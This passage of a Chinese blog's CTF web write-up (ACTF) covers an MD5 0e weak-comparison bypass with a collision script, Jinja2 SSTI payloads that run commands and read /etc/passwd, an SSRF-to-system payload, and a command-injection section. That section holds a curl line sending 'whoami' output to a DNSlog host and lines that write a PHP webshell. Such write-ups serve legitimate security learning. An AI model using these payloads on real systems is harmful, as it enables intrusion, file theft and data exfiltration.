+$md5_test4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2</span><span style="color:#e6db74">&#34;</span>;
+        
+$md5_test5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70</span><span style="color:#e6db74">&#34;</span>;
+$md5_test6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70</span><span style="color:#e6db74">&#34;</span>;
+
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">urldecode</span>($md5_test3)));
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">urldecode</span>($md5_test4)));
+
+<span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">urldecode</span>($md5_test1)) <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">urldecode</span>($md5_test2)));
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p>题目源码</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag&#34;</span>;
+<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$_GET[<span style="color:#e6db74">&#39;source&#39;</span>]){    
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+$a <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;a&#39;</span>];
+$b <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;b&#39;</span>];
+$c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+$check <span style="color:#f92672">=</span> $a <span style="color:#66d9ef">and</span> $b;  <span style="color:#75715e">// $check 的值等于 $a
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($check){
+    <span style="color:#66d9ef">if</span>($a <span style="color:#66d9ef">and</span> $b){
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;No flag!Try it again!&#34;</span>);
+    }
+    <span style="color:#66d9ef">else</span>{
+        <span style="color:#66d9ef">if</span>($c <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($c)){ <span style="color:#75715e">// 弱类型比较，0e 绕过
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">die</span>($flag);
+        }
+    }
+}
+<span style="color:#66d9ef">else</span>{
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Are You kidding?&#34;</span>);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div></li>
+</ul>
+<h4 id="0x02-解题-2">0x02 解题</h4>
+<ul>
+<li>
+<p>PHP有个<code>隐式转换</code>的缺陷，PHP在处理哈希字符串时，会利用<code>”!=”</code>或<code>”==”</code>来对哈希值进行比较，它把每一个以<code>”0E”</code>开头的哈希值都解释为0，所以如果两个不同值经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+</li>
+<li>
+<p>payload：http://149.129.34.135:13333/<code>?a=1&amp;b=0&amp;c=0e215962017</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+$c<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0e215962017&#39;</span>;
+$b<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>($c);
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$b\n</span><span style="color:#e6db74">&#34;</span>;
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($c) <span style="color:#f92672">==</span> $c){
+    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;true&#34;</span>);
+}
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div></li>
+</ul>
+<h4 id="0x03-拓展-1">0x03 拓展</h4>
+<ul>
+<li>
+<p>MD5碰撞脚本：授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+<span style="color:#f92672">import</span> multiprocessing
+<span style="color:#f92672">import</span> hashlib
+<span style="color:#f92672">import</span> random
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> sys
+CHARS <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmp_md5</span>(substr, stop_event, str_len, start<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>):
+    <span style="color:#66d9ef">global</span> CHARS
+    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> stop_event<span style="color:#f92672">.</span>is_set():
+        rnds <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(CHARS) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(size))
+        md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(rnds)
+        value <span style="color:#f92672">=</span> md5<span style="color:#f92672">.</span>hexdigest()
+        <span style="color:#66d9ef">if</span> value[start: start<span style="color:#f92672">+</span>str_len] <span style="color:#f92672">==</span> substr:
+            <span style="color:#66d9ef">print</span> rnds
+            stop_event<span style="color:#f92672">.</span>set()
+            <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            #碰撞双md5 py2
+</span><span style="color:#e6db74">            md5 = hashlib.md5(value)
+</span><span style="color:#e6db74">            if md5.hexdigest()[start: start+str_len] == substr:
+</span><span style="color:#e6db74">                print rnds+ &#34;=&gt;&#34; + value+&#34;=&gt;&#34;+ md5.hexdigest()  + &#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">                stop_event.set()
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    substr <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
+    start_pos <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]) <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>
+    str_len <span style="color:#f92672">=</span> len(substr)
+    cpus <span style="color:#f92672">=</span> multiprocessing<span style="color:#f92672">.</span>cpu_count()
+    stop_event <span style="color:#f92672">=</span> multiprocessing<span style="color:#f92672">.</span>Event()
+    processes <span style="color:#f92672">=</span> [multiprocessing<span style="color:#f92672">.</span>Process(target<span style="color:#f92672">=</span>cmp_md5, args<span style="color:#f92672">=</span>(substr,
+                                        stop_event, str_len, start_pos))
+                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(cpus)]
+    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> processes:
+        p<span style="color:#f92672">.</span>start()
+    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> processes:
+        p<span style="color:#f92672">.</span>join()
+<span style="color:#75715e"># 上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可</span>
+
+<span style="color:#75715e"># 使用方法：python md5Crack.py &#34;你要碰撞的字符串&#34; 字符串的起始位置</span>
+
+<span style="color:#75715e"># 例如：python md5Crack.py “0e&#34; 0  将产生MD5值为0e开头的字符串。 </span>
+
+<span style="color:#75715e"># 原文：https://www.cnblogs.com/-mo-/p/11582424.html</span>
+</code></pre></div></li>
+</ul>
+<hr>
+<h3 id="do_you_like_pythonssti">Do_You_like_Python?(SSTI)</h3>
+<h4 id="0x01-分析-3">0x01 分析</h4>
+<ul>
+<li>涉及知识点
+<ul>
+<li>SSTI(服务端模板注入)</li>
+<li>SST：模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档</li>
+<li>理论网上一堆，参考链接：https://www.cnblogs.com/gzs-monkey/p/10727330.html</li>
+</ul>
+</li>
+<li>那么开始测试吧，知道了漏洞就好测试了，之前就是Fuzz测了一顿
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/ACTFpyssti01.png" alt=""></li>
+<li>flask ssti漏洞源码
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#python3</span>
+<span style="color:#75715e">#Flask version:0.12.2</span>
+<span style="color:#75715e">#Jinja2: 2.10</span>
+<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
+<span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+app <span style="color:#f92672">=</span> Flask(__name__)
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+    name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;guest&#39;</span>)
+    t <span style="color:#f92672">=</span> Template(<span style="color:#e6db74">&#34;Hello &#34;</span> <span style="color:#f92672">+</span> name)
+    <span style="color:#66d9ef">return</span> t<span style="color:#f92672">.</span>render()
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    app<span style="color:#f92672">.</span>run();
+</code></pre></div></li>
+</ul>
+<h4 id="0x02-解题-3">0x02 解题</h4>
+<ul>
+<li>在python里要执行系统命令需要import os模块。想要在模板中直接调用内置模块 os，即<code>需要在模板环境中对其注册</code>，需要在上面的代码里加一句：<code>t.globals['os'] =os</code></li>
+<li>大师傅们搞出来的payload
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># python3</span>
+<span style="color:#75715e"># 命令执行</span>
+{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;</span>) }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+<span style="color:#75715e"># 文件操作</span>
+{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;filename&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read() }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+
+<span style="color:#75715e"># python2</span>
+<span style="color:#75715e"># 注入变量执行命令详见 http://www.freebuf.com/articles/web/98928.html</span>
+<span style="color:#75715e"># 读文件</span>
+{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read() }}
+<span style="color:#75715e"># 写文件</span>
+{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/tmp/1&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;&#34;</span>) }}
+
+<span style="color:#75715e"># https://blog.csdn.net/qq_40657585/article/details/83657220</span>
+</code></pre></div></li>
+<li>一般使用工具tplmap: <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></li>
+<li>本题最终payload
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;flag&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read() }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</code></pre></div></li>
+</ul>
+<hr>
+<h3 id="xss">XSS</h3>
+<p>一直没等到</p>
+<hr>
+<h3 id="ssrf">SSRF</h3>
+<h4 id="0x01-分析--解题-1">0x01 分析 &amp; 解题</h4>
+<ul>
+<li>涉及知识点
+<ul>
+<li>SSRF</li>
+<li>命令执行</li>
+</ul>
+</li>
+<li>要注意的是如果是在html的输入框中直接输入提交就行，但要在浏览器的URL输入的话，一定要记得URL编码一次</li>
+<li><strong>payload：</strong> <code>http%3A%2F%2F192.168.54.3%2F%3Fa%3Dsystem%26b%3Dcat%2520/flag.txt</code></li>
+<li><code>http://192.168.54.3/?a=system&amp;b=cat%20</code></li>
+<li>题目源码
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;url&#39;</span>])){
+        $url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;url&#39;</span>];
+        $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
+        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
+        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
+        <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_HEADER</span>, <span style="color:#ae81ff">0</span>);
+        $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
+        <span style="color:#66d9ef">echo</span> $output;
+    }
+    <span style="color:#75715e">// flag is in 192.168.54.3 :-)
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// view http://192.168.54.3/
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;a&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;b&#39;</span>])){
+        $A <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;a&#39;</span>];
+        $B <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;b&#39;</span>];
+        $A($B);
+    }
+</code></pre></div></li>
+</ul>
+<hr>
+<h3 id="命令执行">命令执行</h3>
+<h4 id="0x01-命令执行--解题">0x01 命令执行 &amp; 解题</h4>
+<ul>
+<li>涉及知识点
+<ul>
+<li>命令执行</li>
+<li>若没有回显，所以要判断命令是否有执行，可以通过三种方式来判断：延时、HTTP请求、DNSlog</li>
+</ul>
+</li>
+<li><strong>payload：</strong>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">curl</span> <span style="color:#e6db74">`whoami`</span><span style="color:#f92672">.</span><span style="color:#a6e22e">h0p23x</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dnslog</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn</span>    <span style="color:#a6e22e">h0p23x</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dnslog</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cn为Dnslog</span>
+
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;?php system(&#39;cat /flag&#39;);?&gt;&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">flag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;?php system(&#39;ls&#39;);?&gt;&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">ls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</code></pre></div></li>
+<li>访问：http://47.93.227.250:29034/flag.php</li>
+</ul>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/actf/">ACTF</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/nmap%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" data-tooltip="Nmap常用指令">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Zor01478. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/nmap%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" data-tooltip="Nmap常用指令">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Zor01478</h4>
+    
+      <div id="about-card-bio">戴了头盔，所以头很铁</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Sec
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        杭州
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://gitee.com/zor01478/blog-picture/raw/master/images/qianyang.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Zor01478.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://Zor01478.github.io/js/clicklove.js"></script>
+  
+
+  
+    <script src="https://Zor01478.github.io/js/snow.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/actf-web-wp\/';
+          
+            this.page.identifier = '\/2021\/02\/actf-web-wp\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
